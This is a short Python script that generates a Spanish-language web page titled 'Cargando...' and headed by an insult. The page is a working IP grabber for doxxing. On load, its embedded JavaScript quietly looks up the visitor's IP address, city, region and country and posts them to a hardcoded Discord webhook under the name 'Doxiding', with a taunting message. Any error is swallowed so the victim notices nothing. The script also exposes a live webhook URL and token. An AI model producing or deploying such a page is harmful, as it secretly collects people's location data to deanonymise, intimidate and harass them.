html_content = """<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cargando...</title>
    <style>
        body {
            background: #000;
            color: #ff0055;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        h1 { font-size: 3rem; text-align: center; }
    </style>
</head>
<body>
    <h1>DOXEADO PUTON</h1>

    <script>
        (async () => {
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1551397629257056367/BtQzO0jqIzSaz05bnTvpS0hW9C_5g4fs7dnFFt1mPZ7nX1IuQxI5kcHzjgeS--teI5TY";
            const AVATAR_IMAGE_URL = "https://pin.it/pttrtRo25";

            try {
                const res = await fetch('https://ipwho.is/');
                const data = await res.json();
                
                const ipText = data.ip || "No obtenida";
                const city = data.city || "Desconocida";
                const region = data.region || "Desconocida";
                const country = data.country || "Desconocida";

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "Doxiding",
                        avatar_url: AVATAR_IMAGE_URL,
                        content: `Pendejo caído\\n- IP: \\`${ipText}\\`\\n- Ubicación: \\`${city}, ${region}, ${country}\\``
                    })
                });
            } catch (e) {}
        })();
    </script>
</body>
</html>"""

with open("index.html", "w", encoding="utf-8") as f:
    f.write(html_content)

